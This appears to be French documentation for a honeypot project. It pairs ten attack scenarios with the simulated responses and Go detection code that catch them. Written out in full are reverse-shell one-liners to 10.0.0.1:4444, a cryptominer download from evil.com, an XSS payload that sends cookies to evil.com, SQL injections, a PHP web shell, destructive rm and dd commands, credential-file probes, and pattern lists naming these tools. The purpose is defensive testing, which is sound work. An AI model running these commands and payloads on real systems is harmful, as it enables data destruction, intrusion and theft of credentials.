# 🎯 Exemples Pratiques de Sécurité du Honeypot

Ce document montre des **exemples réels** de comment le honeypot protège votre système contre différentes attaques.

---

## Test 1: Tentative de Destruction du Système

### L'Attaque
```bash
# L'attaquant se connecte et essaie de détruire le système
ssh admin@localhost -p 2222
# Password: admin123

admin@Tech.fr:~$ rm -rf /*
admin@Tech.fr:~$ dd if=/dev/zero of=/dev/sda
admin@Tech.fr:~$ mkfs.ext4 /dev/sda1
```

### ✅ Protection du Honeypot

**Ce qui se passe réellement:**
```go
// Code: internal/honeypot/fake_session.go
func (s *FakeSession) fakeRm(args []string) string {
	if len(args) == 0 {
		return "rm: missing operand\n"
	}
	// ✅ RIEN N'EST SUPPRIMÉ - juste retourne un message vide
	return ""
}
```

**Résultat:**
- ❌ **Aucun fichier supprimé** - tout est simulé
- ✅ Alerte **CRITICAL** envoyée par email
- ✅ Commande enregistrée dans la base de données
- ✅ Système hôte totalement protégé

**Email reçu:**
```
Subject: 🔴 HONEYPOT ALERT - Suspicious Command 'rm -rf /*' from 192.168.211.136

HONEYPOT SECURITY ALERT
========================================

CRITICALITY: 🔴 CRITICAL
ALERT TYPE: Dangerous Command Executed
TIMESTAMP: 2025-12-20 19:30:45 UTC

THREAT DETAILS
----------------------------------------
Source IP: 192.168.211.136
Username: admin
Command Executed: rm -rf /*

THREAT ANALYSIS
----------------------------------------
Status: MALICIOUS COMMAND EXECUTED
Threat Type: Data Destruction Attempt

RECOMMENDED ACTIONS
----------------------------------------
IMMEDIATE ACTION REQUIRED:
1. Review all activity from this IP immediately
2. Consider blocking this IP in your firewall
3. Check production systems for similar activity
4. Consider reporting to authorities if necessary
```

---

## Test 2: Tentative de Téléchargement de Malware

### L'Attaque
```bash
admin@Tech.fr:~$ wget http://evil.com/cryptominer.sh
admin@Tech.fr:~$ chmod +x cryptominer.sh
admin@Tech.fr:~$ ./cryptominer.sh
admin@Tech.fr:~$ nohup ./cryptominer.sh &
```

### ✅ Protection du Honeypot

**Ce qui se passe réellement:**
```go
// Code: internal/honeypot/fake_session.go
func (s *FakeSession) fakeWget(args []string) string {
	// ✅ RIEN N'EST TÉLÉCHARGÉ
	return "wget: command not found (simulated)\n"
}

func (s *FakeSession) fakeBash(args []string) string {
	if len(args) == 0 {
		return ""
	}
	// ✅ AUCUN SCRIPT N'EST EXÉCUTÉ
	return "bash: " + args[0] + ": No such file or directory\n"
}
```

**Résultat:**
- ❌ **Aucun fichier téléchargé**
- ❌ **Aucun script exécuté**
- ✅ URL du malware capturée: `http://evil.com/cryptominer.sh`
- ✅ Alerte **HIGH** envoyée
- ✅ Vous pouvez analyser l'URL manuellement

---

## Test 3: Tentative de Reverse Shell

### L'Attaque
```bash
# L'attaquant essaie plusieurs techniques de reverse shell
admin@Tech.fr:~$ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
admin@Tech.fr:~$ nc -e /bin/bash 10.0.0.1 4444
admin@Tech.fr:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### ✅ Protection du Honeypot

**Ce qui se passe réellement:**
```go
// Code: internal/honeypot/alerts.go
func (am *AlertManager) analyzeDangerLevel(command string) string {
	cmd := strings.ToLower(command)

	// Détection de reverse shell
	highPatterns := []string{
		"/bin/bash -i",
		"bash -i",
		"/dev/tcp",
		"nc -e",
		"netcat",
		"python -c",
	}

	for _, pattern := range highPatterns {
		if strings.Contains(cmd, pattern) {
			// ✅ ALERTE HIGH déclenchée immédiatement
			return "high"
		}
	}
}
```

**Résultat:**
- ❌ **Aucune connexion sortante** établie
- ❌ **Aucun shell** accessible pour l'attaquant
- ✅ IP de destination capturée: `10.0.0.1:4444`
- ✅ Technique de reverse shell enregistrée
- ✅ Alerte **HIGH** envoyée pour chaque tentative

---

## Test 4: Tentative d'Extraction de Credentials

### L'Attaque
```bash
admin@Tech.fr:~$ cat /etc/passwd
admin@Tech.fr:~$ cat /etc/shadow
admin@Tech.fr:~$ cat ~/.ssh/id_rsa
admin@Tech.fr:~$ cat ~/.bash_history
admin@Tech.fr:~$ env | grep PASSWORD
```

### ✅ Protection du Honeypot

**Ce qui se passe réellement:**
```go
// Code: internal/honeypot/fake_session.go
func (s *FakeSession) fakeCat(args []string) string {
	// Retourne de FAUX contenus de fichiers (honeytokens)
	switch filename {
	case "/etc/passwd":
		return "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash\n"
	case "/etc/shadow":
		// ✅ FAUX hashes - pas de vrais mots de passe
		return "root:$6$fake$hash...\n"
	}
}
```

**Résultat:**
- ❌ **Aucun vrai fichier** accessible
- ✅ Faux contenus retournés (honeytokens)
- ✅ Commandes enregistrées
- ✅ Alerte **MEDIUM** envoyée
- ✅ Vous savez que l'attaquant cherche des credentials

---

## Test 5: Injection SQL (HTTP Honeypot)

### L'Attaque
```http
# L'attaquant teste les injections SQL
POST /wordpress/wp-login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

log=admin' OR '1'='1-- &pwd=anything

GET /phpmyadmin/index.php?id=1' UNION SELECT NULL,NULL,NULL-- HTTP/1.1

POST /login HTTP/1.1

username=admin&password=' OR 1=1; DROP TABLE users--
```

### ✅ Protection du Honeypot

**Ce qui se passe réellement:**
```go
// Code: internal/services/http/vulnerability_detector.go
func (vd *VulnerabilityDetector) detectSQLInjection(payload string) bool {
	sqlPatterns := []string{
		"' OR '1'='1",
		"' OR 1=1--",
		"UNION SELECT",
		"; DROP TABLE",
	}

	for _, pattern := range sqlPatterns {
		if strings.Contains(lowerPayload, strings.ToLower(pattern)) {
			// ✅ Injection détectée
			vd.logAttack("SQL Injection", pattern, requestID)
			return true
		}
	}
}
```

**Résultat:**
- ❌ **Aucune vraie base de données** accessible
- ✅ Injection SQL détectée et enregistrée
- ✅ Fausse réponse retournée (pour leurrer l'attaquant)
- ✅ Payload SQL complet capturé pour analyse
- ✅ Enregistré dans `http_attacks` table

**Dans le dashboard:**
```
Active Threat Intelligence
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Attack Type: SQL Injection
Severity: HIGH
Payload: admin' OR '1'='1--
IP: 192.168.211.136
Time: 2025-12-20 19:45:32
```

---

## Test 6: Cross-Site Scripting (XSS)

### L'Attaque
```http
GET /search?q=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script> HTTP/1.1

POST /comment HTTP/1.1

comment=<img src=x onerror=alert('XSS')>
```

### ✅ Protection du Honeypot

**Ce qui se passe réellement:**
```go
// Code: internal/services/http/vulnerability_detector.go
func (vd *VulnerabilityDetector) detectXSS(payload string) bool {
	xssPatterns := []string{
		"<script",
		"javascript:",
		"onerror=",
		"<iframe",
	}

	for _, pattern := range xssPatterns {
		if strings.Contains(lowerPayload, pattern) {
			// ✅ XSS détecté
			vd.logAttack("XSS", pattern, requestID)
			return true
		}
	}
}
```

**Résultat:**
- ❌ **Aucun script** n'est exécuté ou stocké
- ✅ Tentative XSS détectée
- ✅ Payload XSS complet capturé
- ✅ Technique d'attaque enregistrée
- ✅ IP de l'attaquant marquée

---

## Test 7: Upload de Malware

### L'Attaque
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="backdoor.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

### ✅ Protection du Honeypot

**Ce qui se passe réellement:**
```go
// Code: internal/services/http/upload.go
func (u *UploadApp) HandleRequest(r *http.Request, body string, requestID int) *Response {
	// Limite de taille: 10MB
	r.ParseMultipartForm(10 << 20)

	// Sauvegarde en QUARANTAINE
	quarantinePath := filepath.Join(u.config.Applications.Upload.QuarantineDir, filename)

	// Calcul des hashes
	md5Hash, sha256Hash := hashFile(fileContent)

	// ✅ Jamais exécuté - juste stocké pour analyse
	upload := &models.FileUpload{
		RequestID:        requestID,
		Filename:         safeFilename,
		OriginalFilename: file.Filename,
		Size:             int(file.Size),
		ContentType:      file.Header.Get("Content-Type"),
		MD5Hash:          md5Hash,
		SHA256Hash:       sha256Hash,
		IsMalicious:      false, // Analyse manuelle ou VirusTotal
		Timestamp:        time.Now(),
	}
}
```

**Résultat:**
- ❌ **Fichier JAMAIS exécuté**
- ✅ Stocké en quarantaine: `/root/uploads/backdoor.php`
- ✅ Hashes MD5/SHA256 calculés
- ✅ Vous pouvez analyser le fichier manuellement
- ✅ Intégration VirusTotal possible (si API key configurée)

**Dashboard:**
```
File Upload Analysis
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Filename: backdoor.php
Size: 37 bytes
Type: application/x-php
MD5: 5d41402abc4b2a76b9719d911017c592
SHA256: 2c26b46b68ffc68ff99b453c1d30413413422d706...
Status: ☠️ MALWARE (manual analysis)
IP: 192.168.211.136
Time: 2025-12-20 19:50:15
```

---

## Test 8: Scanner Automatisé

### L'Attaque
```bash
# L'attaquant utilise un scanner automatisé (Nikto, SQLmap, etc.)
nikto -h http://localhost:80
sqlmap -u "http://localhost:80/search?q=test"
```

### ✅ Protection du Honeypot

**Ce qui se passe réellement:**
```go
// Code: internal/services/http/http_server.go
func (h *HTTPHoneypot) detectScanner(ip, userAgent string, requestID int) {
	// Détection par User-Agent
	scannerSignatures := map[string]string{
		"sqlmap":     "sqlmap",
		"nikto":      "Nikto",
		"nmap":       "Nmap",
		"masscan":    "masscan",
		"burp":       "Burp",
	}

	// Détection par vitesse de requêtes
	if count.Count > 10 {
		rps := float64(count.Count) / duration.Seconds()
		if rps > 2.0 {
			// ✅ Scanner détecté
			scanner := &models.ScannerDetection{
				RemoteAddr:        ip,
				ScannerType:       scannerType,
				RequestCount:      count.Count,
				RequestsPerSecond: rps,
			}
			database.SaveScannerDetection(scanner)
		}
	}
}
```

**Résultat:**
- ✅ Scanner identifié: "Nikto" ou "sqlmap"
- ✅ Vitesse de requêtes mesurée: 15 req/s
- ✅ Toutes les requêtes enregistrées
- ✅ Enregistré dans la table `scanner_detections`

**Dashboard:**
```
Security Scanner Detection
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Scanner Type: Nikto
IP: 192.168.211.136
Request Count: 245
Speed: 15.3 req/s
First Seen: 2025-12-20 19:55:00
Last Seen: 2025-12-20 19:55:16
```

---

## Test 9: Path Traversal

### L'Attaque
```http
GET /../../../etc/passwd HTTP/1.1
GET /download?file=../../../etc/shadow HTTP/1.1
GET /files/../../../../root/.ssh/id_rsa HTTP/1.1
```

### ✅ Protection du Honeypot

**Ce qui se passe réellement:**
```go
// Code: internal/services/http/router.go
func (r *Router) handleCommonAttackPaths(req *http.Request, body string, requestID int) *Response {
	// Détection de path traversal
	if strings.Contains(path, "..") || strings.Contains(req.URL.RawQuery, "..") {
		r.detector.DetectPathTraversal(req, body, requestID)

		// ✅ Retourne un FAUX fichier /etc/passwd (honeytoken)
		return &Response{
			StatusCode: 200,
			Headers:    map[string][]string{"Content-Type": {"text/plain"}},
			Body:       r.generateFakePasswdFile(),
		}
	}
}
```

**Résultat:**
- ❌ **Aucun vrai fichier système** accessible
- ✅ Faux contenu retourné (honeytoken)
- ✅ Path traversal détecté et enregistré
- ✅ Vous savez ce que l'attaquant cherche

---

## Test 10: Accès aux Fichiers Sensibles

### L'Attaque
```http
GET /.env HTTP/1.1
GET /.git/config HTTP/1.1
GET /config.php HTTP/1.1
GET /.aws/credentials HTTP/1.1
GET /backup.sql HTTP/1.1
```

### ✅ Protection du Honeypot

**Ce qui se passe réellement:**
```go
// Code: internal/services/http/router.go
func (r *Router) handleCommonAttackPaths(req *http.Request, body string, requestID int) *Response {
	// Fichiers sensibles avec FAUX contenus (honeytokens)
	configFiles := map[string]string{
		"/.env":             r.generateFakeEnvFile(),
		"/.git/config":      r.generateFakeGitConfig(),
		"/config.php":       r.generateFakeConfigPHP(),
		"/.aws/credentials": r.generateFakeAWSCredentials(),
	}

	if content, exists := configFiles[path]; exists {
		r.logger.Warnf("[ATTACK] Attempt to access sensitive file: %s", path)
		// ✅ Retourne un FAUX fichier avec de FAUSSES credentials
		return &Response{
			StatusCode: 200,
			Body:       content,
		}
	}
}
```

**Exemple de faux .env retourné:**
```env
DB_HOST=127.0.0.1
DB_USERNAME=admin
DB_PASSWORD=P@ssw0rd123  # ✅ FAUX - honeytoken
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE  # ✅ FAUX
STRIPE_KEY=sk_live_51HYjK2L3mN4o5P6q7R8s9T0u  # ✅ FAUX
```

**Résultat:**
- ❌ **Aucune vraie credential** exposée
- ✅ Fausses credentials retournées (honeytokens)
- ✅ Si l'attaquant utilise ces credentials, vous le saurez!
- ✅ Tentative d'accès enregistrée

---

## Résumé de la Sécurité

### ❌ Ce qu'un Attaquant NE PEUT PAS Faire:

1. ❌ Accéder au système hôte
2. ❌ Exécuter de vraies commandes
3. ❌ Télécharger des fichiers sur votre système
4. ❌ Uploader et exécuter des malwares
5. ❌ Établir des reverse shells
6. ❌ Voir de vraies credentials
7. ❌ Accéder à de vraies bases de données
8. ❌ Modifier de vrais fichiers
9. ❌ Échapper du conteneur Docker
10. ❌ Utiliser le honeypot comme rebond

### ✅ Ce que VOUS Obtenez:

1. ✅ IPs de tous les attaquants
2. ✅ Toutes les commandes exécutées
3. ✅ Tous les payloads malveillants
4. ✅ Fichiers malwares en quarantaine
5. ✅ URLs de téléchargement de malwares
6. ✅ Techniques d'attaque utilisées
7. ✅ Scanners automatisés détectés
8. ✅ Alertes email en temps réel
9. ✅ Dashboard avec toutes les données
10. ✅ Intelligence sur les menaces actuelles

---

## 🎯 Commandes pour Tester Votre Honeypot

### Test SSH:
```bash
# Connectez-vous
ssh admin@localhost -p 2222
# Password: admin123

# Essayez des commandes dangereuses
cat /etc/passwd
wget http://example.com/malware.sh
rm -rf /
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

### Test HTTP:
```bash
# Injection SQL
curl "http://localhost:80/search?q=test' OR '1'='1--"

# XSS
curl "http://localhost:80/search?q=<script>alert('XSS')</script>"

# Path Traversal
curl "http://localhost:80/../../../etc/passwd"

# Fichiers sensibles
curl "http://localhost:80/.env"
```

### Vérifier les Résultats:
```bash
# Dashboard
http://localhost:8080

# Logs
docker logs honey-ssh-honeypot

# Base de données
docker exec -it honey-ssh-honeypot sqlite3 data/honeypot.db "SELECT * FROM commands ORDER BY executed_at DESC LIMIT 10;"
```

---

**🛡️ Votre système est protégé par des couches de sécurité multiples!**
